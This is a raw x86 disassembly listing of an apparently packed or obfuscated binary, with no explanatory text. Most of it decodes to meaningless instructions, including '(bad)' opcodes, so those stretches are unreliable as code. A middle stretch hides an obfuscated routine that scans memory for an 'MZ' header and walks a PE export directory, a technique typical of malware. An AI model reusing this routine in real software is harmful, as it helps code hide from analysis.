  41dea1:	mov    DWORD PTR [ebp-0x56],edi
  41dea4:	push   eax
  41dea5:	pushf  
  41dea6:	dec    edx
  41dea7:	call   DWORD PTR [edx+0xf]
  41deaa:	mov    eax,0x996ee57a
  41deaf:	outs   dx,BYTE PTR ds:[esi]
  41deb0:	mov    ds:0xf30c2ca7,eax
  41deb5:	les    edi,FWORD PTR [eax]
  41deb7:	and    eax,0x377f635d
  41debc:	lods   al,BYTE PTR ds:[esi]
  41debd:	ret    
  41debe:	out    dx,eax
  41debf:	pop    edx
  41dec0:	cmp    eax,DWORD PTR [ebx-0x549443ba]
  41dec6:	pop    edx
  41dec7:	or     ecx,DWORD PTR [ebp-0x51a8e9ce]
  41decd:	loop   0x41de79
  41decf:	push   esi
  41ded0:	cmp    BYTE PTR [ecx+0x2d1c10],bh
  41ded6:	inc    ebx
  41ded7:	jno    0x41defc
  41ded9:	cwde   
  41deda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dedb:	xor    edi,DWORD PTR [ebp-0x592a6196]
  41dee1:	shr    DWORD PTR [ebx-0x6fe70337],cl
  41dee7:	loope  0x41df20
  41dee9:	inc    ebp
  41deea:	and    ecx,eax
  41deec:	ja     0x41dee4
  41deee:	adc    ebx,esi
  41def0:	jp     0x41df40
  41def2:	dec    esp
  41def3:	sub    cl,BYTE PTR [edx-0x22]
  41def6:	popa   
  41def7:	cmp    al,0xe6
  41def9:	mov    dh,0xa6
  41defb:	sub    edi,esp
  41defd:	dec    esp
  41defe:	test   DWORD PTR [ebx-0x5a654983],ebp
  41df04:	nop
  41df05:	std    
  41df06:	dec    ecx
  41df07:	in     al,dx
  41df08:	and    esi,eax
  41df0a:	dec    eax
  41df0b:	repnz cmp al,0xd1
  41df0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df0f:	(bad)  
  41df10:	in     eax,dx
  41df11:	or     al,0x96
  41df13:	div    BYTE PTR [ebp+0x93df620]
  41df19:	test   eax,0x7e67dc10
  41df1e:	push   edi
  41df1f:	lock call 0xb157:0xbe0912c6
  41df27:	fstp   TBYTE PTR [eax+0x61]
  41df2a:	adc    DWORD PTR [esi+ebx*8+0x32509e8e],edi
  41df31:	arpl   WORD PTR [ecx+0x53],dx
  41df34:	les    ebp,FWORD PTR ds:0xa1775b3c
  41df3a:	test   eax,0x9653fe42
  41df3f:	lock mov esp,0xda465066
  41df45:	mov    cl,dl
  41df47:	pop    ss
  41df48:	sbb    dl,bh
  41df4a:	inc    ecx
  41df4b:	leave  
  41df4c:	outs   dx,DWORD PTR ds:[esi]
  41df4d:	fs push 0xffffffe6
  41df50:	rol    DWORD PTR [ebp+0x58],0xef
  41df54:	xor    DWORD PTR [ecx+ecx*4-0x75bde40b],ecx
  41df5b:	retf   
  41df5c:	nop
  41df5d:	ins    BYTE PTR es:[edi],dx
  41df5e:	rcl    DWORD PTR [ebx+eax*1],1
  41df61:	fincstp 
  41df63:	inc    eax
  41df64:	mov    edi,DWORD PTR [edx+ebx*8-0x2d]
  41df68:	adc    edi,DWORD PTR [ebp-0x18]
  41df6b:	mov    edx,0x6ca621f3
  41df70:	enter  0x6fae,0xa4
  41df74:	loope  0x41df10
  41df76:	repnz mov DWORD PTR [edi],0xb1d62fb9
  41df7d:	adc    DWORD PTR ds:0xadae47b0,edx
  41df83:	imul   esi,DWORD PTR [ebp+0x14dae2cf],0xffffff92
  41df8a:	or     al,0x3a
  41df8c:	add    BYTE PTR [ecx+0x5a383097],ah
  41df92:	shl    esi,0xde
  41df95:	pop    esi
  41df96:	lock shl BYTE PTR [esi+0x4c],cl
  41df9a:	or     bl,dh
  41df9c:	retf   
  41df9d:	lods   eax,DWORD PTR ds:[esi]
  41df9e:	pop    ebx
  41df9f:	mov    cl,0x65
  41dfa1:	in     eax,dx
  41dfa2:	mov    edi,0xccfa91ea
  41dfa7:	sbb    BYTE PTR [ebx+0x3d],ch
  41dfaa:	in     eax,dx
  41dfab:	pop    edi
  41dfac:	sbb    edi,DWORD PTR [eax+0xe]
  41dfaf:	mov    ah,0x45
  41dfb1:	rcl    DWORD PTR [edi],0xde
  41dfb4:	retf   0x47f4
  41dfb7:	shl    DWORD PTR [edx],0x36
  41dfba:	lock lahf 
  41dfbc:	push   ss
  41dfbd:	pop    ebx
  41dfbe:	mov    eax,ds:0x6be7a841
  41dfc3:	push   ss
  41dfc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfc5:	pop    eax
  41dfc6:	scas   al,BYTE PTR es:[edi]
  41dfc7:	add    DWORD PTR [ebp+0x5e],edi
  41dfca:	xor    DWORD PTR es:[edi],ebx
  41dfcd:	xor    DWORD PTR [ecx-0x61],esi
  41dfd0:	jl     0x41df76
  41dfd2:	mov    ss,WORD PTR [edx+edx*8-0x584a7116]
  41dfd9:	sub    DWORD PTR [ebp+0x4a],0xfffffff4
  41dfdd:	addr16 inc ebx
  41dfdf:	outs   dx,BYTE PTR ds:[esi]
  41dfe0:	ds jne 0x41df9e
  41dfe3:	xor    BYTE PTR [ebp+ecx*4+0x75],ah
  41dfe7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dfe8:	retf   
  41dfe9:	xchg   ebx,eax
  41dfea:	mov    ds:0xdfb53f1b,eax
  41dfef:	add    DWORD PTR [eax-0x51d19e25],esi
  41dff5:	out    0x6c,al
  41dff7:	shl    BYTE PTR [ebx],cl
  41dff9:	xor    dl,BYTE PTR [esi-0x452b217d]
  41dfff:	pop    es
  41e000:	pop    edi
  41e001:	lods   al,BYTE PTR ds:[esi]
  41e002:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e003:	mov    WORD PTR [ebx-0xa],ds
  41e006:	es push eax
  41e008:	es loope 0x41dfb4
  41e00b:	push   esp
  41e00c:	jmp    0x74bb:0xae7bdb9c
  41e013:	push   0x2277ef6f
  41e018:	retf   0xfdfb
  41e01b:	mov    ebx,0x8185821e
  41e020:	cld    
  41e021:	cmp    esp,DWORD PTR [edx]
  41e023:	cmp    al,0xef
  41e025:	and    DWORD PTR [edx+0x79],ebx
  41e028:	push   0xa64b2c95
  41e02d:	inc    ebx
  41e02e:	test   al,0xf1
  41e030:	scas   eax,DWORD PTR es:[edi]
  41e031:	xor    DWORD PTR [edi+eiz*4-0x169fe1bc],ebp
  41e038:	xor    al,0xee
  41e03a:	and    eax,0x1ac71e69
  41e03f:	jns    0x41e008
  41e041:	out    dx,eax
  41e042:	and    BYTE PTR [edx-0x58],cl
  41e045:	sbb    ah,bh
  41e047:	call   0xbec11f21
  41e04c:	xor    ah,BYTE PTR [ebx-0x3a]
  41e04f:	pop    ds
  41e050:	scas   al,BYTE PTR es:[edi]
  41e051:	jge    0x41e0c2
  41e053:	rcr    BYTE PTR [ebx+0x5c4e9d12],1
  41e059:	bound  edi,QWORD PTR [edi]
  41e05b:	out    0xcb,al
  41e05d:	leave  
  41e05e:	inc    esp
  41e05f:	cmp    al,0xdc
  41e061:	jnp    0x41e042
  41e063:	mov    al,0x3b
  41e065:	imul   ecx,DWORD PTR [ebx+0x111dfcb0],0x5bcd0398
  41e06f:	fcom   QWORD PTR [eax+0x47]
  41e072:	or     dl,bl
  41e074:	xor    eax,DWORD PTR [edx+0x5a237e7a]
  41e07a:	jecxz  0x41e0bd
  41e07c:	cmp    edx,DWORD PTR [edx-0x3e]
  41e07f:	mov    cl,0xa9
  41e081:	dec    ebx
  41e082:	mov    dh,0x84
  41e084:	dec    ebp
  41e085:	xchg   ecx,eax
  41e086:	xchg   ebp,eax
  41e087:	frstor [esi-0x6a]
  41e08a:	and    eax,0xbe87ee3a
  41e08f:	xchg   esi,eax
  41e090:	inc    esi
  41e091:	push   ebx
  41e092:	add    DWORD PTR [eax],edx
  41e094:	inc    eax
  41e095:	ins    BYTE PTR es:[edi],dx
  41e096:	dec    ecx
  41e097:	add    cl,BYTE PTR [edi-0x663765ee]
  41e09d:	xchg   ebx,eax
  41e09e:	pushf  
  41e09f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0a0:	push   0xffffff93
  41e0a2:	js     0x41e0b5
  41e0a4:	adc    al,0x50
  41e0a6:	mov    ds:0x2a368139,al
  41e0ab:	imul   ecx,DWORD PTR [ebx],0xffffffc2
  41e0ae:	lock mov ss,WORD PTR [ebx]
  41e0b1:	popf   
  41e0b2:	cld    
  41e0b3:	push   0xffffffc9
  41e0b5:	adc    BYTE PTR [ecx-0x23],dh
  41e0b8:	push   esp
  41e0b9:	jmp    0xc770:0x941f913d
  41e0c0:	add    eax,0x428e3f
  41e0c5:	push   esp
  41e0c6:	adc    eax,DWORD PTR [eax]
  41e0c8:	add    BYTE PTR [edi],cl
  41e0ca:	test   DWORD PTR [ecx],esi
  41e0cc:	add    BYTE PTR [eax],al
  41e0ce:	add    BYTE PTR [ebx],bh
  41e0d0:	xrelease mov DWORD PTR ds:0x428e7b,0x261b
  41e0db:	jne    0x41e100
  41e0e1:	push   ebx
  41e0e2:	mov    DWORD PTR ds:0x428e67,0x2b68
  41e0ec:	push   0x70941f97
  41e0f1:	mov    DWORD PTR ds:0x428e63,0x40d9
  41e0fb:	jmp    0x420786
  41e100:	mov    eax,ds:0x428eb7
  41e105:	mov    eax,DWORD PTR [ebp+0x18]
  41e108:	mov    esi,DWORD PTR [ebp+0x1c]
  41e10b:	cmp    eax,0x70941f97
  41e110:	mov    DWORD PTR ds:0x428ebb,0x3db6
  41e11a:	jne    0x41e147
  41e120:	cmp    esi,ebx
  41e122:	mov    DWORD PTR ds:0x428e5f,0x2bd8
  41e12c:	jne    0x41e147
  41e132:	push   ebx
  41e133:	mov    DWORD PTR ds:0x428e2b,0x15b3
  41e13d:	push   0x70941f95
  41e142:	jmp    0x420786
  41e147:	mov    DWORD PTR ds:0x428e73,0x7017
  41e151:	mov    eax,DWORD PTR [ebp+0x18]
  41e154:	mov    esi,DWORD PTR [ebp+0x1c]
  41e157:	mov    DWORD PTR ds:0x428e27,0x78f9
  41e161:	cmp    eax,0x70941f95
  41e166:	jne    0x41e19d
  41e16c:	mov    DWORD PTR ds:0x428ecf,0x6494
  41e176:	cmp    esi,ebx
  41e178:	jne    0x41e19d
  41e17e:	push   ebx
  41e17f:	mov    DWORD PTR ds:0x428ea3,0x58e0
  41e189:	push   0x70941f9b
  41e18e:	mov    DWORD PTR ds:0x428e3f,0x40d6
  41e198:	jmp    0x420786
  41e19d:	mov    DWORD PTR ds:0x428e93,edx
  41e1a3:	mov    eax,DWORD PTR [ebp+0x18]
  41e1a6:	mov    esi,DWORD PTR [ebp+0x1c]
  41e1a9:	mov    DWORD PTR ds:0x428e83,0x6338
  41e1b3:	cmp    eax,0x70941f9b
  41e1b8:	mov    DWORD PTR ds:0x428e53,0x174c
  41e1c2:	jne    0x41e203
  41e1c8:	mov    DWORD PTR ds:0x428e67,0x61b3
  41e1d2:	cmp    esi,ebx
  41e1d4:	mov    DWORD PTR ds:0x428e4b,0x6bb8
  41e1de:	jne    0x41e203
  41e1e4:	mov    DWORD PTR ds:0x428e2b,0x777c
  41e1ee:	push   ebx
  41e1ef:	push   0x70941f99
  41e1f4:	mov    DWORD PTR ds:0x428eb7,0x6b5e
  41e1fe:	jmp    0x420786
  41e203:	mov    eax,DWORD PTR [ebp+0x18]
  41e206:	not    edi
  41e208:	mov    esi,DWORD PTR [ebp+0x1c]
  41e20b:	mov    edi,0x70941f9d
  41e210:	cmp    eax,edi
  41e212:	jne    0x420747
  41e218:	cmp    esi,ebx
  41e21a:	jne    0x420747
  41e220:	mov    eax,DWORD PTR [ebp+0x10]
  41e223:	xor    eax,ecx
  41e225:	add    eax,edx
  41e227:	mov    DWORD PTR [ebp-0x20],eax
  41e22a:	mov    eax,DWORD PTR [ebp+0xc]
  41e22d:	mov    esi,DWORD PTR [ebp-0x8]
  41e230:	xor    eax,ecx
  41e232:	add    eax,edx
  41e234:	imul   eax,DWORD PTR [esi]
  41e237:	mov    esi,DWORD PTR [ebp+0x8]
  41e23a:	xor    esi,ecx
  41e23c:	add    esi,edx
  41e23e:	cmp    esi,eax
  41e240:	mov    eax,DWORD PTR [ebp-0x4]
  41e243:	mov    edi,0xffcd8d0a
  41e248:	je     0x41e267
  41e24e:	mov    esi,DWORD PTR [ebp-0x20]
  41e251:	add    DWORD PTR [eax],esi
  41e253:	mov    eax,DWORD PTR [ebp-0x4]
  41e256:	mov    esi,DWORD PTR [ebp+0xc]
  41e259:	xor    esi,ecx
  41e25b:	add    esi,edx
  41e25d:	imul   esi,DWORD PTR [eax]
  41e260:	mov    DWORD PTR [eax],esi
  41e262:	jmp    0x41e26c
  41e267:	mov    esi,DWORD PTR [ebp+0x14]
  41e26a:	xor    DWORD PTR [eax],esi
  41e26c:	mov    eax,DWORD PTR [ebp-0x4]
  41e26f:	mov    esi,DWORD PTR [ebp+0x10]
  41e272:	xor    esi,ecx
  41e274:	sub    edi,esi
  41e276:	add    DWORD PTR [eax],edi
  41e278:	mov    eax,DWORD PTR [ebp-0x4]
  41e27b:	mov    esi,DWORD PTR [ebp-0x8]
  41e27e:	add    esi,DWORD PTR [eax]
  41e280:	mov    DWORD PTR [ebp-0x8],esi
  41e283:	mov    eax,DWORD PTR [ebp+0xc]
  41e286:	mov    esi,DWORD PTR [ebp+0xc]
  41e289:	xor    esi,ecx
  41e28b:	xor    eax,ecx
  41e28d:	lea    eax,[eax+esi*1+0x64e5ec]
  41e294:	mov    esi,DWORD PTR [ebp+0xc]
  41e297:	xor    esi,ecx
  41e299:	add    esi,edx
  41e29b:	imul   eax,esi
  41e29e:	mov    esi,DWORD PTR [ebp+0xc]
  41e2a1:	xor    esi,ecx
  41e2a3:	sub    esi,eax
  41e2a5:	mov    eax,DWORD PTR [ebp-0x4]
  41e2a8:	add    esi,edx
  41e2aa:	cmp    DWORD PTR [eax],esi
  41e2ac:	mov    eax,DWORD PTR [ebp-0x4]
  41e2af:	mov    esi,DWORD PTR [ebp+0x10]
  41e2b2:	jg     0x41e2c8
  41e2b8:	xor    esi,ecx
  41e2ba:	mov    edi,0xffcd8d0a
  41e2bf:	sub    edi,esi
  41e2c1:	add    DWORD PTR [eax],edi
  41e2c3:	jmp    0x41e2ce
  41e2c8:	xor    esi,ecx
  41e2ca:	add    esi,edx
  41e2cc:	add    DWORD PTR [eax],esi
  41e2ce:	mov    eax,DWORD PTR [ebp-0x8]
  41e2d1:	mov    esi,DWORD PTR [ebp-0x10]
  41e2d4:	mov    eax,DWORD PTR [eax]
  41e2d6:	xor    esi,ecx
  41e2d8:	add    esi,0x3272f5
  41e2de:	mov    DWORD PTR [ebp-0x28],0x7097b85c
  41e2e5:	mov    DWORD PTR [ebp-0x24],ebx
  41e2e8:	not    esi
  41e2ea:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  41e2f1:	mov    DWORD PTR [ebp-0x2c],ebx
  41e2f4:	mov    ebx,DWORD PTR [ebp-0x28]
  41e2f7:	mov    edi,DWORD PTR [ebp-0x24]
  41e2fa:	and    eax,esi
  41e2fc:	mov    esi,0xa143
  41e301:	xor    bx,si
  41e304:	mov    esi,0x412e
  41e309:	add    bx,si
  41e30c:	cmp    WORD PTR [eax],bx
  41e30f:	je     0x41e359
  41e315:	mov    edi,DWORD PTR [ebp-0x10]
  41e318:	xor    edi,ecx
  41e31a:	mov    DWORD PTR [ebp-0x28],0x7097b85c
  41e321:	mov    DWORD PTR [ebp-0x24],0xffffffff
  41e328:	mov    ebx,0xffcd8d0a
  41e32d:	sub    ebx,edi
  41e32f:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  41e336:	add    eax,ebx
  41e338:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  41e33f:	mov    edi,DWORD PTR [ebp-0x28]
  41e342:	mov    ebx,DWORD PTR [ebp-0x24]
  41e345:	mov    ebx,0xa143
  41e34a:	xor    di,bx
  41e34d:	add    di,si
  41e350:	cmp    WORD PTR [eax],di
  41e353:	jne    0x41e315
  41e359:	mov    edi,DWORD PTR [ebp-0x14]
  41e35c:	mov    edi,DWORD PTR [edi]
  41e35e:	mov    ebx,DWORD PTR [eax+0x3c]
  41e361:	lea    edi,[ebx+edi*8+0x78]
  41e365:	mov    edi,DWORD PTR [edi+eax*1]
  41e368:	mov    DWORD PTR [ebp-0x18],edi
  41e36b:	mov    edi,DWORD PTR [ebp+0x8]
  41e36e:	xor    edi,ecx
  41e370:	add    edi,edx
  41e372:	jmp    0x4206eb
  41e377:	push   esi
  41e378:	inc    eax
  41e379:	dec    ebp
  41e37a:	test   DWORD PTR ds:0xe2b09684,eax
  41e380:	(bad)  [ebx]
  41e382:	test   WORD PTR [esi-0x2534ae43],cx
  41e389:	add    BYTE PTR [ebx-0x7c7c9fd9],0x52
  41e390:	mov    edi,0x87702b8b
  41e395:	pop    edi
  41e396:	hlt    
  41e397:	arpl   cx,ax
  41e399:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e39a:	retf   
  41e39b:	xor    edi,DWORD PTR [edi+0x2d649c37]
  41e3a1:	sbb    DWORD PTR [edi+0x1d],ecx
  41e3a4:	xchg   esp,eax
  41e3a5:	add    edi,DWORD PTR [esp+ebp*1+0x37]
  41e3a9:	int    0xbd
  41e3ab:	mov    DWORD PTR [edx-0x8],ebp
  41e3ae:	fwait
  41e3af:	add    bl,cl
  41e3b1:	call   0x49cd:0x7026eb35
  41e3b8:	xchg   ecx,eax
  41e3b9:	inc    ebx
  41e3ba:	lds    edi,FWORD PTR [edi]
  41e3bc:	add    dl,dl
  41e3be:	inc    ecx
  41e3bf:	or     DWORD PTR [edi+0x8d4dccd],0x3a794858
  41e3c9:	data16 jecxz 0x41e3ca
  41e3cc:	aas    
  41e3cd:	jmp    0x3bae:0xf58d441
  41e3d4:	mov    ecx,0x15b44962
  41e3d9:	inc    ecx
  41e3da:	shl    BYTE PTR [edx+0x4],0x2d
  41e3de:	dec    edi
  41e3df:	cmc    
  41e3e0:	stos   BYTE PTR es:[edi],al
  41e3e1:	jnp    0x41e411
  41e3e3:	bound  edi,QWORD PTR [eax+edx*2+0x5fd650fc]
  41e3ea:	adc    DWORD PTR [esi-0x76],edi
  41e3ed:	imul   ecx,DWORD PTR [ecx+0x31],0xf183f281
  41e3f4:	imul   ebx,DWORD PTR [edi-0x1bb9a88c],0x7b
  41e3fb:	and    ebx,DWORD PTR [esp+edx*1-0x75171eff]
  41e402:	jmp    0xee4e9160
  41e407:	cmp    bl,BYTE PTR ds:[edi]
  41e40a:	int3   
  41e40b:	and    al,0xe
  41e40d:	fistp  WORD PTR [esi+eax*2-0x9]
  41e411:	inc    edi
  41e412:	cmp    eax,0xa527d4fe
  41e417:	mov    DWORD PTR [ecx-0x4f],ecx
  41e41a:	add    bl,ch
  41e41c:	test   DWORD PTR [ecx+ebx*4],ebp
  41e41f:	dec    ecx
  41e420:	fnstsw WORD PTR [ebx]
  41e422:	test   eax,0xad971cfe
  41e427:	fld    DWORD PTR [ebx-0x6c]
  41e42a:	mov    fs,esi
  41e42c:	ret    
  41e42d:	pop    edx
  41e42e:	jo     0x41e462
  41e430:	inc    ebx
  41e431:	jne    0x41e468
  41e433:	stc    
  41e434:	push   es
  41e435:	(bad)  
  41e436:	xchg   DWORD PTR ds:0xf69867ce,ebp
  41e43c:	mov    esi,0xe4631e39
  41e441:	mov    ch,0xe5
  41e443:	jne    0x41e468
  41e445:	fwait
  41e446:	xchg   ecx,eax
  41e447:	push   es
  41e448:	call   0x290c:0xd8957de6
  41e44f:	imul   ecx,DWORD PTR [ebx],0x17f07fdc
  41e455:	and    al,0xba
  41e457:	push   0xb62834b1
  41e45c:	inc    ebp
  41e45d:	cwde   
  41e45e:	imul   bl
  41e460:	sti    
  41e461:	pop    eax
  41e462:	fcomp  QWORD PTR [edi]
  41e464:	mov    ebp,0x119655f7
  41e469:	sbb    al,0x4a
  41e46b:	dec    edi
  41e46c:	pop    esp
  41e46d:	into   
  41e46e:	ret    
  41e46f:	dec    eax
  41e470:	lds    edi,FWORD PTR [ebp+0x4e983812]
  41e476:	enter  0xd04f,0xc4
  41e47a:	enter  0x97f0,0xca
  41e47e:	or     esi,DWORD PTR [edx-0x1530dd18]
  41e484:	enter  0x106b,0x25
  41e488:	mov    ds:0xcfd979f1,al
  41e48d:	xor    BYTE PTR ds:0x6f35917,dl
  41e493:	les    eax,FWORD PTR [ecx-0x5ee20f4c]
  41e499:	icebp  
  41e49a:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e49c:	jno    0x41e461
  41e49e:	in     al,dx
  41e49f:	xor    al,0x8
  41e4a1:	mov    bl,0xda
  41e4a3:	and    DWORD PTR [esi-0x6],ebx
  41e4a6:	pop    edx
  41e4a7:	xor    DWORD PTR [esi+edi*1],ebx
  41e4aa:	lds    edi,FWORD PTR [esp+ebp*4-0x1e]
  41e4ae:	mov    BYTE PTR [ecx+0x42cc149e],bh
  41e4b4:	out    dx,al
  41e4b5:	sub    dl,BYTE PTR [edi+0x12]
  41e4b8:	fsubr  DWORD PTR [eax+0x5a]
  41e4bb:	pop    ebx
  41e4bc:	jo     0x41e46d
  41e4be:	xor    ch,bh
  41e4c0:	fs lahf 
  41e4c2:	loope  0x41e535
  41e4c4:	cmc    
  41e4c5:	out    0x81,al
  41e4c7:	outs   dx,BYTE PTR ds:[esi]
  41e4c8:	mov    ebx,0xb0ffc67
  41e4cd:	lahf   
  41e4ce:	sbb    esi,DWORD PTR [edx+edi*2+0x7d]
  41e4d2:	mov    esp,0xd6c9b278
  41e4d7:	int3   
  41e4d8:	xor    ebp,DWORD PTR [edx-0x4572bb3c]
  41e4de:	mov    edi,0x318c8db6
  41e4e3:	pop    ecx
  41e4e4:	(bad)  
  41e4e6:	fwait
  41e4e7:	cdq    
  41e4e8:	mov    al,0xc1
  41e4ea:	xchg   edi,eax
  41e4eb:	sub    edi,0xffffffa8
  41e4ee:	popf   
  41e4ef:	sub    eax,0x47911e55
  41e4f4:	cmp    dl,dl
  41e4f6:	and    eax,0x37993b72
  41e4fb:	xor    BYTE PTR [edx],ch
  41e4fd:	jg     0x41e53c
  41e4ff:	pop    ebp
  41e500:	xor    ch,BYTE PTR ds:0x32da9a26
  41e506:	fcomp  QWORD PTR [eax]
  41e508:	js     0x41e56b
  41e50a:	sbb    eax,0xaaf5bbb5
  41e50f:	push   eax
  41e510:	shl    BYTE PTR [esi],1
  41e512:	xchg   edx,eax
  41e513:	mov    edx,0xb20209ee
  41e518:	mov    dl,0x29
  41e51a:	(bad)  
  41e51b:	and    eax,0xc8a3fdd7
  41e520:	cdq    
  41e521:	fwait
  41e522:	rcl    DWORD PTR [ebx+ecx*4-0x26586791],cl
  41e529:	push   cs
  41e52a:	add    dh,0x84
  41e52d:	push   edx
  41e52e:	cmp    esi,DWORD PTR [eax+0x5870fc7d]
  41e534:	dec    eax
  41e535:	add    DWORD PTR [esi],esi
  41e537:	mov    ds:0x2ad3156c,eax
  41e53c:	nop
  41e53d:	jmp    0x9e91:0x6d35ed90
  41e544:	pop    edi
  41e545:	mov    ebp,0x3a1ff995
  41e54a:	sub    BYTE PTR [esi],dh
  41e54c:	xchg   edi,eax
  41e54d:	jg     0x41e50e
  41e54f:	cli    
  41e550:	int    0x21
  41e552:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e553:	jge    0x41e574
  41e555:	cli    
  41e556:	ds mov cl,0x9b
  41e559:	or     ch,bh
  41e55b:	mov    ch,0x52
  41e55d:	xchg   DWORD PTR [edi],ebp
  41e55f:	popf   
  41e560:	sub    BYTE PTR [esi],ch
  41e562:	jl     0x41e5bb
  41e564:	pop    ds
  41e565:	out    dx,eax
  41e566:	mov    ah,0x10
  41e568:	dec    ecx
  41e569:	in     al,dx
  41e56a:	aas    
  41e56b:	sub    esp,DWORD PTR [ecx]
  41e56d:	or     bh,BYTE PTR [ebx-0x16159f30]
  41e573:	push   ss
  41e574:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e575:	cmp    edi,edi
  41e577:	in     al,0xc0
  41e579:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e57a:	inc    edi
  41e57b:	or     bl,BYTE PTR [ebx-0x7a]
  41e57e:	lahf   
  41e57f:	inc    ecx
  41e580:	pop    eax
  41e581:	frstor [edi-0x26]
  41e584:	stos   BYTE PTR es:[edi],al
  41e585:	mov    ch,0xa4
  41e587:	test   BYTE PTR [edi-0x6df78cc5],0xe9
  41e58e:	lahf   
  41e58f:	xchg   BYTE PTR [ecx],dh
  41e591:	inc    eax
  41e592:	pop    esp
  41e593:	mov    ebx,ecx
  41e595:	shl    bh,1
  41e597:	xor    al,0x92
  41e599:	sahf   
  41e59a:	js     0x41e56a
  41e59c:	or     al,0x98
  41e59e:	fiadd  DWORD PTR [ebx]
  41e5a0:	(bad)  
  41e5a2:	mov    edi,ss
  41e5a4:	cwde   
  41e5a5:	mov    esp,0x5690827c
  41e5aa:	jge    0x41e5c3
  41e5ac:	inc    esp
  41e5ad:	pop    edi
  41e5ae:	sbb    bl,BYTE PTR [esi+0x20]
  41e5b1:	outs   dx,DWORD PTR ds:[esi]
  41e5b2:	pop    ebx
  41e5b3:	ins    BYTE PTR es:[edi],dx
  41e5b4:	pop    esp
  41e5b5:	adc    ah,BYTE PTR [edx]
  41e5b7:	cli    
  41e5b8:	and    DWORD PTR [ebx+0x79],ebx
  41e5bb:	iret   
  41e5bc:	sub    eax,DWORD PTR [eax]
  41e5be:	xor    BYTE PTR [edi],0xb2
  41e5c1:	xchg   ebp,eax
  41e5c2:	js     0x41e5d4
  41e5c4:	addr16 jmp 0xfa71:0x8d022176
  41e5cc:	int3   
  41e5cd:	inc    ecx
  41e5ce:	push   ebp
  41e5cf:	mov    ah,0x14
  41e5d1:	add    ebp,0xffffff9c
  41e5d4:	leave  
  41e5d5:	scas   al,BYTE PTR es:[edi]
  41e5d6:	loopne 0x41e581
  41e5d8:	pop    edi
  41e5d9:	popa   
  41e5da:	jb     0x41e5b1
  41e5dc:	xchg   edx,eax
  41e5dd:	test   al,0x7
  41e5df:	add    BYTE PTR [edx+0x7d],ch
  41e5e2:	inc    edi
  41e5e3:	hlt    
  41e5e4:	jb     0x41e646
  41e5e6:	xor    BYTE PTR [edx+0x23],cl
  41e5e9:	retf   
  41e5ea:	ins    DWORD PTR es:[edi],dx
  41e5eb:	jb     0x41e5b7
  41e5ed:	ret    
  41e5ee:	inc    ecx
  41e5ef:	xor    eax,0x298bcea6
  41e5f4:	mov    edx,DWORD PTR [edx+ebp*4+0x1a]
  41e5f8:	hlt    
  41e5f9:	popa   
  41e5fa:	(bad)  
  41e5fb:	mov    dh,0xa9
  41e5fd:	cwde   
  41e5fe:	fs in  al,dx
  41e600:	xchg   ecx,eax
  41e601:	mov    esi,DWORD PTR [edi+eiz*1+0x67da9077]
  41e608:	xchg   BYTE PTR [eax],dh
  41e60a:	fcomp  st(3)
  41e60c:	pop    ebp
  41e60d:	lock int3 
  41e60f:	xchg   ebp,eax
  41e610:	dec    eax
  41e611:	or     DWORD PTR es:[ebp-0x6201ad60],eax
  41e618:	(bad)  
  41e619:	popa   
  41e61a:	dec    ebx
  41e61b:	pop    edx
  41e61c:	(bad)  [ecx-0x7c]
  41e61f:	add    BYTE PTR [edi+edi*2+0x69],0x72
  41e624:	es cld 
  41e626:	cwde   
  41e627:	outs   dx,BYTE PTR ds:[esi]
  41e628:	sub    BYTE PTR [esi+ebp*2+0x66060ce8],0xfb
  41e630:	fidivr WORD PTR [ecx-0x42]
  41e633:	ins    BYTE PTR es:[edi],dx
  41e634:	push   esi
  41e635:	call   0x9d9924d0
  41e63a:	jecxz  0x41e600
  41e63c:	sar    DWORD PTR [edi+0x30b125d4],cl
  41e642:	das    
  41e643:	enter  0x321f,0x7b
  41e647:	and    DWORD PTR [eax+0x55],0x8402d911
  41e64e:	sub    BYTE PTR [eax-0xd],dh
  41e651:	cmc    
  41e652:	test   al,0x58
  41e654:	pop    es
  41e655:	mov    bl,0x81
  41e657:	mov    edx,0x2ad98305
  41e65c:	cmp    ebp,ebx
  41e65e:	cmp    DWORD PTR [esi+0x27c756c5],ebp
  41e664:	sbb    eax,DWORD PTR [edi+0x44440317]
  41e66a:	sub    edi,ebp
  41e66c:	arpl   WORD PTR [edx+ebx*8+0x33],bx
  41e670:	jecxz  0x41e5fc
  41e672:	lock in eax,dx
  41e674:	rcl    dh,cl
  41e676:	dec    eax
  41e677:	push   ds
  41e678:	add    eax,0x7a4f3e36
  41e67d:	stos   DWORD PTR es:[edi],eax
  41e67e:	sbb    esp,edi
  41e680:	loope  0x41e6a1
  41e682:	fimul  WORD PTR [eax]
  41e684:	push   ss
  41e685:	push   ebp
  41e686:	mov    cl,0x43
  41e688:	mov    al,ds:0x290bf6e1
  41e68d:	push   ecx
  41e68e:	xchg   ebp,eax
  41e68f:	adc    dl,BYTE PTR [esi-0x1b]
  41e692:	lds    ecx,FWORD PTR [edx-0x30a08dc3]
  41e698:	xchg   DWORD PTR [ebp-0x22],eax
  41e69b:	adc    BYTE PTR [edx],bh
  41e69d:	mov    bh,0x6
  41e69f:	aam    0xa3
  41e6a1:	int3   
  41e6a2:	xchg   ebp,eax
  41e6a3:	es pusha 
  41e6a5:	mov    ebx,0x5a3bb394
  41e6ab:	push   ebx
  41e6ac:	mov    eax,0x9d98f4fd
  41e6b1:	in     al,0xd2
  41e6b3:	adc    BYTE PTR ds:0x257d3f1,dl
  41e6b9:	push   ds
  41e6ba:	dec    ecx
  41e6bb:	xlat   BYTE PTR ds:[ebx]
  41e6bc:	dec    ecx
  41e6bd:	inc    eax
  41e6be:	xlat   BYTE PTR ds:[ebx]
  41e6bf:	repnz pop ecx
